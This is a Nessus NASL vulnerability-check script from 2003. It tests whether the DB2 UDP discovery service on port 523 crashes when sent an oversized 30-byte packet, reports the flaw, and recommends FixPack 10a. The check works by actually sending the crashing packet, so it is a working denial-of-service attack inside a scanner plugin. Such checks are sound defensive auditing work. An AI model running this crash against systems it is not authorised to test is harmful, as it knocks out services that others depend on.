#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GNU Public Licence
#
# References:
# Date: Thu, 18 Sep 2003 20:17:36 -0400
# From: "Aaron C. Newman" <aaron@NEWMAN-FAMILY.COM>
# Subject: AppSecInc Security Alert: Denial of Service Vulnerability in DB2 Discovery Service
# To: NTBUGTRAQ@LISTSERV.NTBUGTRAQ.COM
#

if(description)
{
 script_id(11896);
 script_version("$Revision: 1.3 $");
 name["english"] = "DB2 discovery service DOS";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to crash the DB2 UDP based discovery service
by sending a too long packet.

An attacker  may use this attack to make this service crash 
continuously, preventing you from working properly.


Solution: upgrade your software - apply FixPack 10a

Risk factor : Low";

 script_description(english:desc["english"]);
 
 summary["english"] = "A too long UDP packet kills the remote service";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2003 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";

 script_family(english:family["english"], francais:family["francais"]);
 script_require_udp_ports(523);
 exit(0);
}

#

include("network_func.inc");

port = 523;
if (! get_udp_port_state(port)) exit(0);

# There is probably a clean way to do it and change this script to 
# an ACT_GATHER_INFO or ACT_MIXED...

if (! test_udp_port(port: port)) exit(0);

s = open_sock_udp(port);
if (! s) exit(0);
send(socket: s, data: crap(30));
close(s);

if (! test_udp_port(port: port)) security_hole(port);
